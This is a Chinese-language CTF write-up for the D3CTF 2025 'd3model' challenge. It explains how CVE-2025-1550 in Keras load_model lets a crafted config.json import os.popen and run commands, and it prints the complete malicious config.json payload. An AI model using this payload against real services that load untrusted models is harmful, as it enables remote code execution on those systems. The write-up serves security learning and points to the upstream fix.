# d3model

## 题目简述

题目仓库地址为 `https://github.com/Klutton/D3CTF2025-d3model`。仓库的关键信息是：Web 服务会加载用户提交的 Keras 模型文件，攻击面在模型反序列化而不是传统路由漏洞。题目基于 CVE-2025-1550，核心是恶意 `.keras` 文件中的 `config.json` 可以影响 `keras.models.load_model` 的类/函数解析流程。

此题目基于 CVE-2025-1550.

当调用函数 keras.models.load_model 加载恶意 keras 文件时，其中特殊构造的config.json 可以触发 RCE (Remote Code Execution).

Keras 修复 PR `https://app.codecov.io/gh/keras-team/keras/pull/20751` 的关键信息是：问题出在反序列化时允许根据配置动态解析模块、类名或函数名。修复思路是收紧可加载对象范围和反序列化路径，避免攻击者通过 `module` / `class_name` 指向任意 Python 对象。

## 解题过程

补丁中可以看到，反序列化逻辑会在 `module` 满足条件时动态导入模块，并通过 `vars(mod).get(name, None)` 取出目标对象：

```python
if module == "keras.src" or module.startswith("keras.src."):
    try:
        mod = importlib.import_module(module)
        obj = vars(mod).get(name, None)
        if obj is not None:
            return obj
    except ModuleNotFoundError:
        ...
```

模型构建流程中，`serialization_lib.deserialize_keras_object` 会根据 layer 配置反序列化对象；后续只检查结果是否为 `Operation`：

```python
layer = serialization_lib.deserialize_keras_object(
    layer_data,
    custom_objects=custom_objects,
)
if not isinstance(layer, Operation):
    raise ValueError(
        "Unexpected object from deserialization, expected a layer or "
        f"operation, got a {type(layer)}"
    )
created_layers[layer_name] = layer
```

这意味着可以通过恶意配置影响模块和对象解析。只需要查找 `_retrieve_class_or_fn` 的调用位置即可。

导入 os.popen：

调试时可以看到恶意 `config.json` 让 `module = "os"`、`name = "popen"`，随后 `_retrieve_class_or_fn` 进入 `importlib.import_module(module)`，导入 `os` 并取出 `os.popen`。

在 process_node 处调用 popen：

继续向下执行时，`process_node` 会把 `inbound_nodes` 中的命令作为参数传入 `popen`，等价于执行：

```python
os.popen("echo $FLAG > /app/index.html")
```

我们可以将 flag 通过index.html 回显。

访问 Web 首页即可看到写入的 flag 内容。

只需要替换普通 keras 文件下的 config.json：

```json
{
  "module": "keras.models",
  "class_name": "Model",
  "config": {
    "name": "my_model",
    "layers": [
      {
        "name": "layer_name",
        "module": "os",
        "class_name": "popen",
        "config": "config",
        "inbound_nodes": [
          {
            "args": [
              "echo $FLAG > /app/index.html"
            ],
            "kwargs": {}
          }
        ]
      }
    ],
    "input_layers": "",
    "output_layers": ""
  }
}
```

## 方法总结

- 核心技巧：利用 Keras 模型反序列化时的动态对象解析，把模型层配置中的 `module` 和 `class_name` 指向 `os.popen`，在 `inbound_nodes` 中传入命令参数。
- 识别信号：Web 服务允许上传并加载模型文件，且使用 `keras.models.load_model` 处理不可信模型时，应优先检查反序列化配置能否导入任意模块。
- 复用要点：恶意 `.keras` 不需要完整训练模型，关键是替换内部 `config.json`；命令可把 flag 写到 Web 可访问文件中完成回显。
